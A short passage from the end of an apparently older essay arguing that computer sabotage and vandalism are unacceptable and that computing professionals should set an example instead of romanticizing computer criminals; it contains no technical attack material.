thatsuch behavior is clearly inappropriate now.andP;  Entire businesses are nowdependent, wisely or not, on the undisturbed functioning of computers.andP;  Manypeople's careers, property, and lives may be placed in jeopardy by acts ofcomputer sabotage and mischief.andM;As a society, we cannot afford the consequences of such actions.andP;  Asprofessionals, computer scientists and computer engineers cannot afford totolerate the romanticization of computer vandals and computer criminals, andwe must take the lead by setting proper examples.andP;  Let us hope there are nofurther incidents to underscore this lesson.andO;</TEXT></DOC>